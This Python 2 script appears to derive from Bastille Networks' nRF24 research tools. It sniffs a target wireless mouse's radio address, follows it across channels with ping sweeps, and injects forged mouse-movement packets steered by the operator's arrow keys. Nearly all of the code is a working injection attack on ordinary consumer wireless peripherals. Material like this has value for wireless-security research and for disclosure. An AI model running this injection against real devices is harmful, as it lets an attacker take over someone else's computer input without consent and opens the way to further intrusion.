#!/usr/bin/env python2
'''
  Copyright (C) 2016 Bastille Networks

  This program is free software: you can redistribute it and/or modify
  it under the terms of the GNU General Public License as published by
  the Free Software Foundation, either version 3 of the License, or
  (at your option) any later version.

  This program is distributed in the hope that it will be useful,
  but WITHOUT ANY WARRANTY; without even the implied warranty of
  MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
  GNU General Public License for more details.

  You should have received a copy of the GNU General Public License
  along with this program.  If not, see <http://www.gnu.org/licenses/>.
'''

from lib import common
from pynput.keyboard import Listener, Key
import time, logging
from check_calc import *

MAX_12B = 2047
MIN_12B = -2048
step = 1
running = True
x = 0
y = 0

def on_press(key):  # The function that's called when a key is pressed
    global x, y, MAX_12B, MIN_12B, step

    step = 3

    if key == Key.up:
        y = -1 * step
        #if y > MAX_12B:
        #    y = MAX_12B
        #print('Up key pressed: ' + str(y))

    elif key == Key.down:
        y = step
        #if y < MIN_12B:
        #    y = MIN_12B
        #print('Down key pressed: '+ str(y))
    
    elif key == Key.left:
        x = -1 * step
        #if x < MIN_12B:
        #    x = MIN_12B
        #print('Left key pressed: ' + str(x))
    
    elif key == Key.right:
        x = step
        #if x > MAX_12B:
        #    x = MAX_12B
        #print('Right key pressed: ' + str(x))

def on_release(key):  # The function that's called when a key is released
    global x,y,running,step 
    
    step = 1
    if key == Key.up:
        y = 0
        #print('Up key de-pressed: ' + str(y))
    elif key == Key.down:
        y = 0
        #print('Down key de-pressed: ' + str(y))
    elif key == Key.left:
        x = 0
        #print('Left key de-pressed: ' + str(x))
    elif key == Key.right:
        x = 0
        #print('Right key de-pressed: ' + str(x))
    elif key == Key.esc:
        print("Esc key de-pressed")
        running = False
def two_comp(val,bits):
    t_val = val
    if val < 0:
        t_val = 2**12 + val 
    return t_val

def build_payload(button,x,y,x_scroll,y_scroll):

    x_pld = hex(two_comp(x,12)).replace('0x','').zfill(3)
    y_pld = hex(two_comp(y,12)).replace('0x','').zfill(3)
    
    xs_pld = hex(two_comp(x_scroll,8)).replace('0x','').zfill(2)
    ys_pld = hex(two_comp(y_scroll,8)).replace('0x','').zfill(2)
    
    pream = '00'
    cmd = 'C2'
    unused = '00'
    button_pld = '00'

    pld = pream + cmd + button_pld + unused + x_pld[1:3] + y_pld[2] + x_pld[0] + y_pld[0:2] + xs_pld + ys_pld
    pld = pld + calc_checksum(pld)
    return pld

def main():
  global x,y,running

  # Start keyboard listener
  listener = Listener(
        on_press=on_press,
        on_release=on_release)
  
  listener.start()
  # Keep alive payload 00:40:01:18:A7
  # Parse command line arguments and initialize the radio
  common.init_args('./nrf24-sniffer.py')
  common.parser.add_argument('-a', '--address', type=str, help='Address to sniff, following as it changes channels', required=True)
  common.parser.add_argument('-t', '--timeout', type=float, help='Channel timeout, in milliseconds', default=100)
  common.parser.add_argument('-k', '--ack_timeout', type=int, help='ACK timeout in microseconds, accepts [250,4000], step 250', default=250)
  common.parser.add_argument('-r', '--retries', type=int, help='Auto retry limit, accepts [0,15]', default=1, choices=xrange(0, 16), metavar='RETRIES')
  common.parser.add_argument('-p', '--ping_payload', type=str, help='Ping payload, ex 0F:0F:0F:0F', default='00:40:01:18:A7', metavar='PING_PAYLOAD')
  common.parse_and_init()

  # Parse the address
  address = common.args.address.replace(':', '').decode('hex')[::-1][:5]
  address_string = ':'.join('{:02X}'.format(ord(b)) for b in address[::-1])
  if len(address) < 2:
    raise Exception('Invalid address: {0}'.format(common.args.address))

  # Put the radio in sniffer mode (ESB w/o auto ACKs)
  common.radio.enter_sniffer_mode(address)

  # Convert channel timeout from milliseconds to seconds
  timeout = float(common.args.timeout) / float(1000)
  print('Payload')
  print(common.args.ping_payload)

  # Parse the ping payload
  ping_payload = common.args.ping_payload.replace(':', '').decode('hex')

  # Format the ACK timeout and auto retry values
  ack_timeout = int(common.args.ack_timeout / 250) - 1
  ack_timeout = max(0, min(ack_timeout, 15))
  retries = max(0, min(common.args.retries, 15))

  # Sweep through the channels and decode ESB packets in pseudo-promiscuous mode
  last_ping = time.time()
  channel_index = 0
  while running:

    # Follow the target device if it changes channels
    if time.time() - last_ping > timeout:

      # First try pinging on the active channel
      if not common.radio.transmit_payload(ping_payload, ack_timeout, retries):

        # Ping failed on the active channel, so sweep through all available channels
        success = False
        for channel_index in range(len(common.channels)):
          common.radio.set_channel(common.channels[channel_index])
          if common.radio.transmit_payload(ping_payload, ack_timeout, retries):

            # Ping successful, exit out of the ping sweep
            last_ping = time.time()
            logging.debug('Ping success on channel {0}'.format(common.channels[channel_index]))
            success = True
            break

        # Ping sweep failed
        if not success: logging.debug('Unable to ping {0}'.format(address_string))

      # Ping succeeded on the active channel
      else:
        logging.debug('Ping success on channel {0}'.format(common.channels[channel_index]))
        last_ping = time.time()

    # Try to send mouse packets if arrow keys has been pressed
    if x != 0 or y != 0:
      mouse_payload = build_payload(0,x,y,0,0)
      print(mouse_payload)
      common.radio.transmit_payload(mouse_payload.decode('hex'), ack_timeout, retries)
      

    # Receive payloads
    value = common.radio.receive_payload()
    if value[0] == 0:

      # Reset the channel timer
      last_ping = time.time()

      # Split the payload from the status byte
      payload = value[1:]

      # Log the packet
      logging.info('{0: >2}  {1: >2}  {2}  {3}'.format(
                common.channels[channel_index],
                len(payload),
                address_string,
                ':'.join('{:02X}'.format(b) for b in payload)))
    
    # End of main loop
  
  listener.stop()

if __name__ == '__main__':
    main()
